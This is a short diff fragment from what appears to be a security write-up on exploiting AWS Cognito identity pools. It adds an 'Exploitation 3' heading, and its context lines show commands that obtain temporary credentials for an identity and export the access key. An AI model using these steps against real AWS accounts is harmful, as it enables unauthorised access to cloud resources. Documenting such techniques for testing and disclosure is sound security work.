@@ -75,6 +75,8 @@ $ aws cognito-identity get-credentials-for-identity --identity-id us-east-1:157d
 
 > Worked!
 
+### 3. Exploitation 3:
+
 Let's export it!
 ```
 $ export AWS_ACCESS_KEY_ID=ASIAR...
